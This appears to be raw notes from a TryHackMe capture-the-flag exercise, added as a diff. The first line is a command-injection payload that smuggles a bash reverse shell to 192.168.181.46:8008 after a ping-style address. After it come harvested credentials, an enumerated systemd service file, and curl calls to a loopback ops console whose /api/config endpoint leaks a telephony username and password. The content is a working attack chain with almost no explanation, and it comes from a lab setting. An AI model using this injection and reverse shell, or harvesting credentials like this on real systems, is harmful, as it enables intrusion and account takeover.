@@ -1,0 +1,63 @@
+127.0.0.1;/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.181.46/8008 0>&1'
+
+
+"FreePBXUCPTemplateCreator"
+St4yN0t1c3d_2026
+
+
+[Install]
+WantedBy=multi-user.target
+web@tryhackme-2404:/var/www/infinity_pool$ cat /etc/systemd/system/cc-watchtower.service
+<pool$ cat /etc/systemd/system/cc-watchtower.service
+[Unit]
+Description=Closed Circuit - Watchtower ops console (loopback)
+After=network.target
+
+[Service]
+User=svc-watch
+Group=svc-watch
+WorkingDirectory=/var/www/infinity_pool/watchtower
+ExecStart=/var/www/infinity_pool/watchtower/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:3000 wsgi:app
+Restart=on-failure
+RestartSec=2
+
+
+curl -sS http://127.0.0.1:3000
+curl -sS http://127.0.0.1:3000
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Watchtower &mdash; ops console</title>
+<style>
+  body{margin:0;background:#0a0b0e;color:#e7e9ee;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+  header{padding:16px 24px;border-bottom:1px solid #262a31;letter-spacing:.2em}
+  main{max-width:760px;margin:0 auto;padding:40px 24px}
+  .tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:20px}
+  .tile{background:#15171c;border:1px solid #262a31;border-radius:10px;padding:18px}
+  .tile b{display:block;font-size:1.6rem}
+  .muted{color:#8b909b}
+  code{color:#c9a24b}
+</style>
+</head>
+<body>
+<header>WATCHTOWER &middot; <span class="muted">internal</span></header>
+<main>
+  <h1>Surveillance operations</h1>
+  <p class="muted">Loopback-only console. Authenticated by network position.</p>
+  <div class="tiles">
+    <div class="tile"><b>1184</b><span class="muted">active feeds</span></div>
+    <div class="tile"><b>OK</b><span class="muted">datastore link</span></div>
+    <div class="tile"><b>root</b><span class="muted">automation worker</span></div>
+  </div>
+  <p class="muted" style="margin-top:28px">
+    Service endpoints: <code>/api/health</code> &middot; <code>/api/config</code>
+  </p>
+</main>
+</body>
+
+
+</html>web@tryhackme-2404:/var/www/infinity_pool$ curl -sS http://127.0.0.1:3000/api/config
+<ity_pool$ curl -sS http://127.0.0.1:3000/api/config
+{"automation_endpoint":"http://127.0.0.1:9000","note":"internal network only -- do not expose","ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.","telephony_pass":"St4yN0t1c3d_2026","telephony_portal":"http://127.0.0.1:8080/ucp","telephony_user":"FreePBXUCPTemplateCreator"}
